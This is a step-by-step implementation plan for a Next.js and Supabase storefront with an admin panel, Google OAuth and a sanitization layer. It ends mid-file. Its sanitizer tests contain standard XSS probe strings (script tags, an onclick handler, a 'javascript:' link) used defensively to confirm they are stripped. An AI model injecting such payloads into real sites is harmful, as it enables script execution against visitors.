# Purple Acorns Creations — Core Website Implementation Plan

> **For agentic workers:** REQUIRED: Use superpowers:subagent-driven-development (if subagents available) or superpowers:executing-plans to implement this plan. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build and deploy the full Purple Acorns Creations website — public storefront (homepage, shop, story, legal), admin panel (content, events, gallery, branding, integrations), Google OAuth authentication, and basic integrations (Square, Behold.so Instagram, Mailchimp newsletter signup, Vercel Analytics).

**Architecture:** Next.js 14 App Router with Supabase (PostgreSQL + Auth + Storage). Public pages are server-rendered for performance and SEO. Admin panel lives under `/admin/*`, protected by Next.js middleware that validates Google OAuth session and checks email allowlist. Two CSS themes (Warm Artisan / Soft Botanical) implemented as CSS custom properties, switched via `data-theme` on `<html>`, active theme read from Supabase on every server render. All database reads use Supabase's parameterized client (no raw SQL). All user-supplied content rendered in the browser is HTML-sanitized via `sanitize-html`.

**Tech Stack:** Next.js 14, Supabase (PostgreSQL + Auth + Storage), Vercel (deployment), Google OAuth via Supabase, Mailchimp API (newsletter), Behold.so (Instagram embed), Vercel Analytics + Speed Insights, CSS Modules + CSS custom properties, Jest + React Testing Library, `sanitize-html` (XSS prevention), Cormorant Garamond + DM Sans (Google Fonts).

**Spec:** `docs/superpowers/specs/2026-03-17-purple-acorns-creations-design.md`
**Plan 2 (AI + Newsletter + Reports):** `docs/superpowers/plans/2026-03-17-ai-smart-features-plan.md`
**GitHub:** https://github.com/y3llojama/purple-acorns-creations

---

## Security Model

These rules apply throughout every task. No exceptions.

| Threat | Mitigation |
|---|---|
| **XSS (stored)** | All DB content rendered as HTML must pass through `sanitize-html` with a strict allowlist before `dangerouslySetInnerHTML`. Inline styles and event handlers are stripped. |
| **XSS (reflected)** | Never render URL params or query strings directly into HTML. Use Next.js `searchParams` only for logic, never for raw HTML output. |
| **SQL injection** | Supabase JS client uses parameterized queries for all reads/writes — never construct raw SQL strings. |
| **Open redirect** | All external links in content (story, events, announcements) must be validated as absolute URLs starting with `https://` before being rendered as `href`. Any link not matching is stripped. |
| **CSRF** | All admin mutation API routes (`/api/admin/*`) verify the Supabase session server-side before executing. No state-changing operations on GET requests. |
| **Unauthorized admin access** | Three-layer auth: Supabase signups disabled + pre-registered users only + Next.js middleware email allowlist. |
| **Sensitive data exposure** | `SUPABASE_SERVICE_ROLE_KEY`, `ANTHROPIC_API_KEY`, `MAILCHIMP_API_KEY` are server-only env vars, never prefixed with `NEXT_PUBLIC_`. `mailchimp_api_key` stored in DB is only readable server-side via service role. |
| **Phishing via contact form** | Contact form submissions are validated (name, email format, message length ≤ 2000 chars), rate-limited (1 submission per IP per 60s via in-memory map), and delivered via server-side email only — no auto-reply that could be spoofed. |
| **Clickjacking** | Add `X-Frame-Options: SAMEORIGIN` and `Content-Security-Policy: frame-ancestors 'self'` in `next.config.js` headers. |
| **Image upload abuse** | Validate MIME type and file size (≤ 5MB) server-side before uploading to Supabase Storage. Never trust the client-supplied file type. |

---

## File Map

```
purple-acorns-creations/
├── .env.local                             # Local secrets (gitignored)
├── .env.example                           # Template for env vars (no real values)
├── .gitignore
├── next.config.js                         # Security headers, Next.js config
├── package.json
├── jest.config.js
├── jest.setup.js
├── middleware.ts                          # Auth guard: /admin/*, email allowlist
│
├── app/
│   ├── layout.tsx                         # Root layout: theme, fonts, Analytics, AnnouncementBanner
│   ├── globals.css                        # CSS custom properties (both themes), base styles
│   ├── page.tsx                           # Homepage (all 8 sections)
│   ├── shop/page.tsx                      # Square Online iframe embed
│   ├── our-story/page.tsx                 # Long-form story (sanitized HTML)
│   ├── privacy/page.tsx                   # Privacy policy (sanitized HTML)
│   ├── terms/page.tsx                     # Terms of service (sanitized HTML)
│   │
│   ├── admin/
│   │   ├── layout.tsx                     # Admin shell: sidebar + main
│   │   ├── login/page.tsx                 # "Sign in with Google"
│   │   ├── page.tsx                       # Dashboard: quick-action tiles
│   │   ├── content/page.tsx               # Edit hero, story, legal pages
│   │   ├── events/page.tsx                # Add/edit/delete events
│   │   ├── gallery/page.tsx               # Upload/reorder/delete photos
│   │   ├── branding/page.tsx              # Theme toggle, logo, announcement
│   │   └── integrations/page.tsx          # Square, Behold, Mailchimp, social links
│   │
│   └── api/
│       ├── auth/callback/route.ts         # Supabase OAuth callback
│       ├── newsletter/subscribe/route.ts  # Mailchimp subscribe (server-side)
│       ├── contact/route.ts               # Contact form submission (rate-limited, phishing-safe)
│       └── admin/
│           ├── content/route.ts           # Save content key-value (auth required)
│           ├── events/route.ts            # CRUD events (auth required)
│           ├── gallery/route.ts           # Save/delete gallery items (auth required)
│           └── settings/route.ts         # Save settings row (auth required)
│
├── components/
│   ├── layout/
│   │   ├── Header.tsx
│   │   ├── Footer.tsx
│   │   └── AnnouncementBanner.tsx
│   ├── home/
│   │   ├── HeroSection.tsx
│   │   ├── StoryTeaser.tsx
│   │   ├── FeaturedPieces.tsx
│   │   ├── GalleryStrip.tsx
│   │   ├── NextEvent.tsx
│   │   ├── InstagramFeed.tsx
│   │   └── NewsletterSignup.tsx
│   ├── admin/
│   │   ├── AdminSidebar.tsx
│   │   ├── ImageUploader.tsx              # Validates MIME + size before upload
│   │   └── ConfirmDialog.tsx
│   └── ui/
│       ├── Button.tsx
│       └── FormField.tsx
│
├── lib/
│   ├── supabase/
│   │   ├── client.ts
│   │   ├── server.ts
│   │   └── types.ts
│   ├── sanitize.ts                        # Shared sanitize-html config (strict allowlist)
│   ├── validate.ts                        # Input validation helpers (email, URL, length)
│   ├── auth.ts                            # Server-side session verification for API routes
│   ├── theme.ts
│   └── content.ts
│
├── supabase/
│   └── migrations/
│       └── 001_initial_schema.sql
│
└── public/
    └── og-image.jpg
```

---

## Phase 1: Project Foundation

### Task 1: Initialize repo and Next.js project

**Files:**
- Create: `package.json`, `next.config.js`, `.gitignore`, `.env.example`

- [ ] **Step 1: Create GitHub repo**
```bash
cd /Users/gautamzalpuri/Dev/experiments/code/purple-acorns-creations
git init
gh repo create y3llojama/purple-acorns-creations --public --description "Purple Acorns Creations — handcrafted jewelry studio website" --source=. --remote=origin --push
```

- [ ] **Step 2: Initialize Next.js app**
```bash
npx create-next-app@latest . --typescript --tailwind=false --eslint --app --src-dir=false --import-alias="@/*" --use-npm
```
Accept all defaults. This creates the App Router structure with TypeScript.

- [ ] **Step 3: Install dependencies**
```bash
npm install @supabase/supabase-js @supabase/ssr @vercel/analytics @vercel/speed-insights sanitize-html
npm install --save-dev @types/sanitize-html jest jest-environment-jsdom @testing-library/react @testing-library/jest-dom @testing-library/user-event ts-jest
```

- [ ] **Step 4: Create `next.config.js` with security headers**
```js
/** @type {import('next').NextConfig} */
const nextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          { key: 'X-Frame-Options', value: 'SAMEORIGIN' },
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline' https://w.behold.so",
              "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
              "font-src 'self' https://fonts.gstatic.com",
              "frame-src 'self' https://*.squarespace.com https://*.square.site https://*.squareup.com",
              "img-src 'self' data: https://*.supabase.co https://cdn.behold.so",
              "connect-src 'self' https://*.supabase.co https://*.mailchimp.com",
              "frame-ancestors 'self'",
            ].join('; '),
          },
          { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
        ],
      },
    ]
  },
  images: {
    remotePatterns: [
      { protocol: 'https', hostname: '*.supabase.co' },
    ],
  },
}

module.exports = nextConfig
```

- [ ] **Step 5: Create `.env.example`**
```
# Supabase — public (safe to expose in browser)
NEXT_PUBLIC_SUPABASE_URL=
NEXT_PUBLIC_SUPABASE_ANON_KEY=

# Supabase — server-only (never expose to browser)
SUPABASE_SERVICE_ROLE_KEY=

# Admin auth allowlist (server-only)
ADMIN_EMAILS=purpleacornzcreations@gmail.com,write2spica@gmail.com

# AI providers (Plan 2 — leave blank for now)
ANTHROPIC_API_KEY=
OPENAI_API_KEY=
GROQ_API_KEY=
```

- [ ] **Step 6: Create `.env.local` from example, fill in Supabase values**
```bash
cp .env.example .env.local
# Edit .env.local with actual values from Supabase dashboard
```

- [ ] **Step 7: Configure Jest**

Create `jest.config.js`:
```js
const nextJest = require('next/jest')
const createJestConfig = nextJest({ dir: './' })
module.exports = createJestConfig({
  setupFilesAfterEnv: ['<rootDir>/jest.setup.js'],
  testEnvironment: 'jest-environment-jsdom',
  testEnvironmentOptions: {
    env: { ADMIN_EMAILS: 'purpleacornzcreations@gmail.com,write2spica@gmail.com' },
  },
})
```

Create `jest.setup.js`:
```js
import '@testing-library/jest-dom'
```

Update `package.json` scripts:
```json
"test": "jest",
"test:watch": "jest --watch"
```

- [ ] **Step 8: Commit**
```bash
git add .
git commit -m "feat: initialize Next.js project with security headers and dependencies"
git push -u origin main
```

---

### Task 2: Security utilities — sanitizer, validator, auth helper

**Files:**
- Create: `lib/sanitize.ts`
- Create: `lib/validate.ts`

These are foundational — every subsequent task depends on them. (`lib/auth.ts` is created in Task 3, Step 8, after `lib/supabase/server.ts` exists.)

- [ ] **Step 1: Write tests for sanitize**

Create `__tests__/lib/sanitize.test.ts`:
```typescript
import { sanitizeContent, sanitizeText } from '@/lib/sanitize'

describe('sanitizeContent', () => {
  it('allows safe HTML tags', () => {
    const result = sanitizeContent('<p>Hello <strong>world</strong></p>')
    expect(result).toBe('<p>Hello <strong>world</strong></p>')
  })
  it('strips script tags', () => {
    const result = sanitizeContent('<p>Safe</p><script>alert("xss")</script>')
    expect(result).not.toContain('<script>')
    expect(result).toContain('<p>Safe</p>')
  })
  it('strips inline event handlers', () => {
    const result = sanitizeContent('<p onclick="alert(1)">Click me</p>')
    expect(result).not.toContain('onclick')
  })
  it('strips javascript: links', () => {
    const result = sanitizeContent('<a href="javascript:alert(1)">Click</a>')
    expect(result).not.toContain('javascript:')
  })
  it('allows safe href links', () => {
    const result = sanitizeContent('<a href="https://example.com">Link</a>')
    expect(result).toContain('href="https://example.com"')
  })
})

describe('sanitizeText', () => {
  it('strips all HTML', () => {
    expect(sanitizeText('<b>bold</b>')).toBe('bold')
  })
  it('returns plain text unchanged', () => {
    expect(sanitizeText('Hello world')).toBe('Hello world')
  })
})
```

- [ ] **Step 2: Run tests — expect FAIL**
```bash
npm test -- --testPathPattern=sanitize
```

- [ ] **Step 3: Create `lib/sanitize.ts`**
```typescript
import sanitizeHtml from 'sanitize-html'

// Safe HTML tags and attributes for content pages (story, legal)
const CONTENT_OPTIONS: sanitizeHtml.IOptions = {
  allowedTags: ['h1', 'h2', 'h3', 'h4', 'p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a', 'blockquote', 'hr'],
  allowedAttributes: {
    a: ['href', 'target', 'rel'],
  },
  allowedSchemes: ['https', 'mailto'],
  // Force safe link attributes
  transformTags: {
    a: (tagName, attribs) => {
      const href = attribs.href ?? ''
      if (!href.startsWith('https://') && !href.startsWith('mailto:')) {
        return { tagName: 'span', attribs: {} }
      }
      return {
        tagName,
        attribs: { ...attribs, target: '_blank', rel: 'noopener noreferrer' },
      }
    },
  },
}

// Plain text — strips all HTML
const TEXT_OPTIONS: sanitizeHtml.IOptions = {
  allowedTags: [],
  allowedAttributes: {},
}

export function sanitizeContent(html: string): string {
  return sanitizeHtml(html, CONTENT_OPTIONS)
}

export function sanitizeText(input: string): string {
  return sanitizeHtml(input, TEXT_OPTIONS).trim()
}
```

- [ ] **Step 4: Run tests — expect PASS**
```bash
npm test -- --testPathPattern=sanitize
```

- [ ] **Step 5: Write tests for validate**

Create `__tests__/lib/validate.test.ts`:
```typescript
import { isValidEmail, isValidHttpsUrl, clampLength } from '@/lib/validate'

describe('isValidEmail', () => {
  it('accepts valid email', () => expect(isValidEmail('test@example.com')).toBe(true))
  it('rejects missing @', () => expect(isValidEmail('notanemail')).toBe(false))
  it('rejects empty string', () => expect(isValidEmail('')).toBe(false))
})

describe('isValidHttpsUrl', () => {
  it('accepts https URL', () => expect(isValidHttpsUrl('https://example.com')).toBe(true))
  it('rejects http URL', () => expect(isValidHttpsUrl('http://example.com')).toBe(false))
  it('rejects javascript scheme', () => expect(isValidHttpsUrl('javascript:alert(1)')).toBe(false))
  it('rejects empty string', () => expect(isValidHttpsUrl('')).toBe(false))
})

describe('clampLength', () => {
  it('truncates long strings', () => expect(clampLength('hello', 3)).toBe('hel'))
  it('leaves short strings unchanged', () => expect(clampLength('hi', 10)).toBe('hi'))
})
```

- [ ] **Step 6: Create `lib/validate.ts`**
```typescript
export function isValidEmail(email: string): boolean {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

export function isValidHttpsUrl(url: string): boolean {
  try {
    const parsed = new URL(url)
    return parsed.protocol === 'https:'
  } catch {
    return false
  }
}

export function clampLength(str: string, max: number): string {
  return str.slice(0, max)
}
```

- [ ] **Step 7: Run validate tests — expect PASS**
```bash
npm test -- --testPathPattern=validate
```

- [ ] **Step 8: Commit**
```bash
git add lib/sanitize.ts lib/validate.ts __tests__/lib/
git commit -m "feat: add security utilities (sanitizer and validator)"
```

---

### Task 3: Supabase schema, client helpers, and auth helper

**Files:**
- Create: `supabase/migrations/001_initial_schema.sql`
- Create: `lib/supabase/types.ts`
- Create: `lib/supabase/client.ts`
- Create: `lib/supabase/server.ts`
- Create: `lib/auth.ts` (depends on `lib/supabase/server.ts` above)

- [ ] **Step 1: Create Supabase project**

Go to supabase.com → New project. Copy URL and keys into `.env.local`.

- [ ] **Step 2: Write migration `supabase/migrations/001_initial_schema.sql`**

```sql
-- Settings (single row)
create table settings (
  id uuid primary key default gen_random_uuid(),
  theme text not null default 'warm-artisan' check (theme in ('warm-artisan', 'soft-botanical')),
  logo_url text,
  square_store_url text,
  contact_email text,
  mailchimp_api_key text,
  mailchimp_audience_id text,
  ai_provider text check (ai_provider in ('claude', 'openai', 'groq')),
  announcement_enabled boolean not null default false,
  announcement_text text,
  announcement_link_url text,
  announcement_link_label text,
  social_instagram text default 'purpleacornz',
  social_facebook text,
  social_tiktok text,
  social_pinterest text,
  social_x text,
  behold_widget_id text,
  updated_at timestamptz default now()
);
insert into settings (id) values (gen_random_uuid());

-- Events
create table events (
  id uuid primary key default gen_random_uuid(),
  name text not null,
  date date not null,
  time text,
  location text not null,
  description text,
  link_url text,
  link_label text,
  created_at timestamptz default now()
);

-- Gallery
create table gallery (
  id uuid primary key default gen_random_uuid(),
  url text not null,
  alt_text text not null,
  category text check (category in ('rings','necklaces','earrings','bracelets','crochet','other')),
  sort_order integer not null default 0,
  created_at timestamptz default now()
);

-- Featured products
create table featured_products (
  id uuid primary key default gen_random_uuid(),
  name text not null,
  price numeric(10,2) not null,
  description text,
  image_url text not null,
  square_url text,
  sort_order integer not null default 0,
  is_active boolean not null default true
);

-- Content key-value store
create table content (
  key text primary key,
  value text not null default '',
  updated_at timestamptz default now()
);

-- Seed default content keys with safe default values
insert into content (key, value) values
  ('hero_tagline', 'Handcrafted with intention, worn with joy.'),
  ('hero_subtext', 'Crochet jewelry, sterling silver, and artisan pieces made with love by a mother-daughter duo in Brooklyn, NY.'),
  ('story_teaser', 'We are Purple Acorns Creations — a mother and daughter who share a passion for making things by hand.'),
  ('story_full', '<p>Our story begins at the kitchen table...</p><p>Add your full story here via the admin panel.</p>'),
  ('privacy_policy', '<h1>Privacy Policy</h1>
<p><strong>Last updated:</strong> March 2026</p>
<p>Purple Acorns Creations ("we", "us", or "our") operates this website. This policy explains how we handle your information.</p>
<h2>Information We Collect</h2>
<ul>
<li><strong>Email address</strong> — when you subscribe to our newsletter (via Mailchimp)</li>
<li><strong>Name and message</strong> — when you submit our contact form (used only to respond to you)</li>
</ul>
<h2>How We Use Your Information</h2>
<ul>
<li>To send you newsletters about new pieces and upcoming events (unsubscribe any time)</li>
<li>To respond to your inquiry</li>
</ul>
<h2>Third-Party Services</h2>
<ul>
<li><strong>Square</strong> — handles all payments and checkout</li>
<li><strong>Mailchimp</strong> — manages our email list</li>
<li><strong>Vercel Analytics</strong> — anonymous page views only, no personal data, no cookies</li>
<li><strong>Behold.so</strong> — displays our Instagram feed</li>
<li><strong>Google</strong> — used for admin login only, not for visitors</li>
</ul>
<h2>Your Rights</h2>
<p>Unsubscribe from our newsletter at any time using the link in any email. To request data deletion, email us at purpleacornzcreations@gmail.com.</p>
<h2>Contact</h2>
<p>purpleacornzcreations@gmail.com · Brooklyn, NY</p>'),
  ('terms_of_service', '<h1>Terms of Service</h1>
<p><strong>Last updated:</strong> March 2026</p>
<h2>Handmade Products</h2>
<p>All products are handmade. Slight variations are natural and not defects.</p>
<h2>Purchases &amp; Returns</h2>
<p>All purchases are processed through Square. Contact us within 7 days of receiving your order with any issues.</p>
<h2>Custom Orders</h2>
<p>Custom orders require a deposit and are non-refundable once work has begun.</p>
<h2>Intellectual Property</h2>
<p>All photos, designs, and content on this website are owned by Purple Acorns Creations.</p>
<h2>Governing Law</h2>
<p>These terms are governed by the laws of the State of New York.</p>
<h2>Contact</h2>
<p>purpleacornzcreations@gmail.com · Brooklyn, NY</p>');

-- RLS policies
alter table settings enable row level security;
alter table events enable row level security;
alter table gallery enable row level security;
alter table featured_products enable row level security;
alter table content enable row level security;

-- Public can SELECT non-sensitive columns from settings
create policy "Public read settings" on settings
  for select using (true);

-- Public can read events, gallery, products, content
create policy "Public read events" on events for select using (true);
create policy "Public read gallery" on gallery for select using (true);
create policy "Public read products" on featured_products for select using (true);
create policy "Public read content" on content for select using (true);

-- All writes go through service_role key (server-side only, bypasses RLS)
-- No additional write policies needed for anon users
```

- [ ] **Step 3: Run migration in Supabase SQL Editor**

Paste the full SQL above into Supabase dashboard → SQL Editor → Run.

- [ ] **Step 4: Create `lib/supabase/types.ts`**
```typescript
export type Theme = 'warm-artisan' | 'soft-botanical'
export type Category = 'rings' | 'necklaces' | 'earrings' | 'bracelets' | 'crochet' | 'other'
export type AiProvider = 'claude' | 'openai' | 'groq'

export interface Settings {
  id: string; theme: Theme; logo_url: string | null; square_store_url: string | null
  contact_email: string | null; mailchimp_api_key: string | null; mailchimp_audience_id: string | null
  ai_provider: AiProvider | null; announcement_enabled: boolean; announcement_text: string | null
  announcement_link_url: string | null; announcement_link_label: string | null
  social_instagram: string | null; social_facebook: string | null; social_tiktok: string | null
  social_pinterest: string | null; social_x: string | null; behold_widget_id: string | null
  updated_at: string
}

export interface Event {
  id: string; name: string; date: string; time: string | null; location: string
  description: string | null; link_url: string | null; link_label: string | null; created_at: string
}

export interface GalleryItem {
  id: string; url: string; alt_text: string; category: Category | null; sort_order: number; created_at: string
}

export interface FeaturedProduct {
  id: string; name: string; price: number; description: string | null
  image_url: string; square_url: string | null; sort_order: number; is_active: boolean
}

export interface ContentRow { key: string; value: string; updated_at: string }
```

- [ ] **Step 5: Create `lib/supabase/client.ts`**
```typescript
import { createBrowserClient } from '@supabase/ssr'

export function createClient() {
  return createBrowserClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
  )
}
```

- [ ] **Step 6: Create `lib/supabase/server.ts`**
```typescript
import { createServerClient } from '@supabase/ssr'
import { createClient } from '@supabase/supabase-js'
import { cookies } from 'next/headers'

export function createServerSupabaseClient() {
  const cookieStore = cookies()
  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    { cookies: { get: (n) => cookieStore.get(n)?.value } }
  )
}

export function createServiceRoleClient() {
  return createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!
  )
}
```

- [ ] **Step 7: Create `lib/theme.ts` and `lib/content.ts`**

`lib/theme.ts`:
```typescript
import { createServiceRoleClient } from '@/lib/supabase/server'
import type { Settings, Theme } from '@/lib/supabase/types'

export async function getSettings(): Promise<Settings> {
  const supabase = createServiceRoleClient()
  const { data } = await supabase.from('settings').select('*').single()
  return data as Settings
}

export async function getTheme(): Promise<Theme> {
  const settings = await getSettings()
  return settings?.theme ?? 'warm-artisan'
}
```

`lib/content.ts`:
```typescript
import { createServiceRoleClient } from '@/lib/supabase/server'

export async function getContent(key: string): Promise<string> {
  const supabase = createServiceRoleClient()
  const { data } = await supabase.from('content').select('value').eq('key', key).single()
  return data?.value ?? ''
}

export async function getAllContent(): Promise<Record<string, string>> {
  const supabase = createServiceRoleClient()
  const { data } = await supabase.from('content').select('key, value')
  return Object.fromEntries((data ?? []).map(r => [r.key, r.value]))
}
```

- [ ] **Step 8: Create `lib/auth.ts`** — server-side session verifier (placed here so it can import from the server client created above)

```typescript
import { createServerSupabaseClient } from '@/lib/supabase/server'
import { NextResponse } from 'next/server'

export async function requireAdminSession(): Promise<
  { session: { user: { email: string } }; error: null } |
  { session: null; error: NextResponse }
> {
  const supabase = createServerSupabaseClient()
  const { data: { session } } = await supabase.auth.getSession()

  if (!session) {
    return { session: null, error: NextResponse.json({ error: 'Unauthorized' }, { status: 401 }) }
  }

  const adminEmails = (process.env.ADMIN_EMAILS ?? '').split(',').map(e => e.trim())
  if (!adminEmails.includes(session.user.email ?? '')) {
    return { session: null, error: NextResponse.json({ error: 'Forbidden' }, { status: 403 }) }
  }

  return { session: session as { user: { email: string } }, error: null }
}
```

- [ ] **Step 9: Write and run type tests**

Create `__tests__/lib/supabase/types.test.ts`:
```typescript
import type { Theme, Settings } from '@/lib/supabase/types'
describe('Supabase types', () => {
  it('Theme accepts warm-artisan', () => { const t: Theme = 'warm-artisan'; expect(t).toBe('warm-artisan') })
  it('Theme accepts soft-botanical', () => { const t: Theme = 'soft-botanical'; expect(t).toBe('soft-botanical') })
})
```

```bash
npm test -- --testPathPattern=types
```
Expected: PASS

- [ ] **Step 10: Commit**
```bash
git add supabase/ lib/ __tests__/lib/
git commit -m "feat: Supabase schema, client helpers, and auth helper"
```

---

### Task 4: Authentication — Google OAuth + middleware

**Files:**
- Create: `middleware.ts`
- Create: `app/api/auth/callback/route.ts`
- Create: `app/admin/login/page.tsx`

- [ ] **Step 1: Enable Google OAuth in Supabase**

Supabase dashboard → Authentication → Providers → Google:
- Enable Google provider
- Paste Google OAuth Client ID + Secret (from Google Cloud Console → Credentials)
- Pre-register admin users: Auth → Users → "Invite user" for both emails
- Auth → Settings → disable "Allow new users to sign up"

- [ ] **Step 2: Write middleware test**

Create `__tests__/middleware.test.ts`:
```typescript
describe('Admin email allowlist', () => {
  const adminEmails = (process.env.ADMIN_EMAILS ?? '').split(',').map(e => e.trim())
  it('allows purpleacornzcreations@gmail.com', () => expect(adminEmails).toContain('purpleacornzcreations@gmail.com'))
  it('allows write2spica@gmail.com', () => expect(adminEmails).toContain('write2spica@gmail.com'))
  it('rejects unknown email', () => expect(adminEmails).not.toContain('attacker@gmail.com'))
})
```

```bash
npm test -- --testPathPattern=middleware
```
Expected: PASS

- [ ] **Step 3: Create `middleware.ts`**
```typescript
import { createServerClient } from '@supabase/ssr'
import { NextResponse, type NextRequest } from 'next/server'

export async function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl
  if (!pathname.startsWith('/admin')) return NextResponse.next()
  if (pathname === '/admin/login') return NextResponse.next()

  let response = NextResponse.next({ request })
  const supabase = createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    {
      cookies: {
        get: (n) => request.cookies.get(n)?.value,
        set: (n, v, o) => { response.cookies.set({ name: n, value: v, ...o }) },
        remove: (n, o) => { response.cookies.set({ name: n, value: '', ...o }) },
      },
    }
  )

  const { data: { session } } = await supabase.auth.getSession()
  if (!session) return NextResponse.redirect(new URL('/admin/login', request.url))

  const adminEmails = (process.env.ADMIN_EMAILS ?? '').split(',').map(e => e.trim())
  if (!adminEmails.includes(session.user.email ?? '')) {
    await supabase.auth.signOut()
    return NextResponse.redirect(new URL('/admin/login?error=unauthorized', request.url))
  }

  return response
}

export const config = { matcher: ['/admin/:path*'] }
```

- [ ] **Step 4: Create `app/api/auth/callback/route.ts`**
```typescript
import { createServerClient } from '@supabase/ssr'
import { cookies } from 'next/headers'
import { NextResponse } from 'next/server'

export async function GET(request: Request) {
  const { searchParams, origin } = new URL(request.url)
  const code = searchParams.get('code')
  if (!code) return NextResponse.redirect(`${origin}/admin/login?error=no_code`)

  const cookieStore = cookies()
  const supabase = createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    {
      cookies: {
        get: (n) => cookieStore.get(n)?.value,
        set: (n, v, o) => cookieStore.set({ name: n, value: v, ...o }),
        remove: (n, o) => cookieStore.set({ name: n, value: '', ...o }),
      },
    }
  )
  const { error } = await supabase.auth.exchangeCodeForSession(code)
  if (error) return NextResponse.redirect(`${origin}/admin/login?error=auth_failed`)

  return NextResponse.redirect(`${origin}/admin`)
}
```

- [ ] **Step 5: Create `app/admin/login/page.tsx`**
```typescript
'use client'
import { createClient } from '@/lib/supabase/client'
import { useSearchParams } from 'next/navigation'

export default function AdminLoginPage() {
  const searchParams = useSearchParams()
  const error = searchParams.get('error')

  async function signInWithGoogle() {
    const supabase = createClient()
    await supabase.auth.signInWithOAuth({
      provider: 'google',
      options: { redirectTo: `${window.location.origin}/api/auth/callback` },
    })
  }

  const errorMessages: Record<string, string> = {
    unauthorized: 'This Google account is not authorized. Please use an authorized account.',
    auth_failed: 'Sign-in failed. Please try again.',
    no_code: 'Authentication error. Please try again.',
  }

  return (
    <main style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'var(--color-bg)' }}>
      <div style={{ textAlign: 'center', padding: '48px', maxWidth: '400px', width: '90%' }}>
        <h1 style={{ fontFamily: 'var(--font-display)', fontSize: '28px', marginBottom: '8px', color: 'var(--color-primary)' }}>
          Purple Acorns Admin
        </h1>
        <p style={{ color: 'var(--color-text-muted)', marginBottom: '32px', fontSize: '18px' }}>
          Sign in to manage your site
        </p>
        {error && errorMessages[error] && (
          <p role="alert" style={{ color: '#c05050', marginBottom: '24px', fontSize: '16px', padding: '12px', background: '#fff0f0', borderRadius: '4px' }}>
            {errorMessages[error]}
          </p>
        )}
        <button
          onClick={signInWithGoogle}
          style={{ background: 'var(--color-primary)', color: 'var(--color-accent)', border: 'none', padding: '16px 32px', fontSize: '18px', borderRadius: '4px', cursor: 'pointer', width: '100%', minHeight: '48px' }}
          aria-label="Sign in with your authorized Google account"
        >
          Sign in with Google
        </button>
      </div>
    </main>
  )
}
```

- [ ] **Step 6: Run all tests**
```bash
npm test
```
Expected: All PASS

- [ ] **Step 7: Commit**
```bash
git add middleware.ts app/api/auth/ app/admin/login/ __tests__/middleware.test.ts
git commit -m "feat: Google OAuth authentication with email allowlist and secure middleware"
```

---

## Phase 2: Design System

### Task 5: CSS themes, typography, layout

**Files:**
- Create/modify: `app/globals.css`
- Modify: `app/layout.tsx`

- [ ] **Step 1: Write `app/globals.css`**
```css
@import url('https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,400;1,500&family=DM+Sans:wght@300;400;500;600&display=swap');

[data-theme="warm-artisan"] {
  --color-bg: #f5ede0; --color-surface: #fff8f0; --color-primary: #2d1b4e;
  --color-accent: #d4a853; --color-secondary: #c9956b; --color-text: #1a0f2e;
  --color-text-muted: #6b5b7b; --color-border: #e8d9c5; --color-focus: #d4a853;
}

[data-theme="soft-botanical"] {
  --color-bg: #f8f4f0; --color-surface: #f0e8f5; --color-primary: #3d2b4e;
  --color-accent: #9b7bb8; --color-secondary: #9fb89f; --color-text: #2a1f3a;
  --color-text-muted: #6b7b6b; --color-border: #e0d4ec; --color-focus: #9b7bb8;
}

:root {
  --font-display: 'Cormorant Garamond', Georgia, serif;
  --font-body: 'DM Sans', system-ui, sans-serif;
}

*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

body {
  font-family: var(--font-body);
  font-size: 18px;
  line-height: 1.6;
  color: var(--color-text);
  background: var(--color-bg);
}

h1, h2, h3, h4, h5, h6 { font-family: var(--font-display); font-weight: 500; line-height: 1.2; }
h1 { font-size: 64px; } h2 { font-size: 48px; } h3 { font-size: 36px; }
h4 { font-size: 28px; } h5 { font-size: 22px; }

:focus-visible { outline: 3px solid var(--color-focus); outline-offset: 3px; }

.skip-link {
  position: absolute; top: -100%; left: 0;
  background: var(--color-primary); color: var(--color-accent);
  padding: 12px 20px; z-index: 9999; font-size: 18px;
}
.skip-link:focus { top: 0; }

@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; }
}

@media (max-width: 768px) {
  h1 { font-size: 40px; } h2 { font-size: 32px; } h3 { font-size: 26px; }
}
```

- [ ] **Step 2: Update `app/layout.tsx`**
```typescript
import type { Metadata } from 'next'
import { Analytics } from '@vercel/analytics/react'
import { SpeedInsights } from '@vercel/speed-insights/next'
import { getTheme, getSettings } from '@/lib/theme'
import AnnouncementBanner from '@/components/layout/AnnouncementBanner'
import Header from '@/components/layout/Header'
import Footer from '@/components/layout/Footer'
import { sanitizeText } from '@/lib/sanitize'
import '@/app/globals.css'

export const metadata: Metadata = {
  title: { default: 'Purple Acorns Creations', template: '%s — Purple Acorns Creations' },
  description: 'Handcrafted jewelry by a mother-daughter duo in Brooklyn, NY.',
  openGraph: { images: ['/og-image.jpg'] },
}

export default async function RootLayout({ children }: { children: React.ReactNode }) {
  const [theme, settings] = await Promise.all([getTheme(), getSettings()])

  // Sanitize announcement text before passing to client component
  const announcementText = settings.announcement_text ? sanitizeText(settings.announcement_text) : ''

  return (
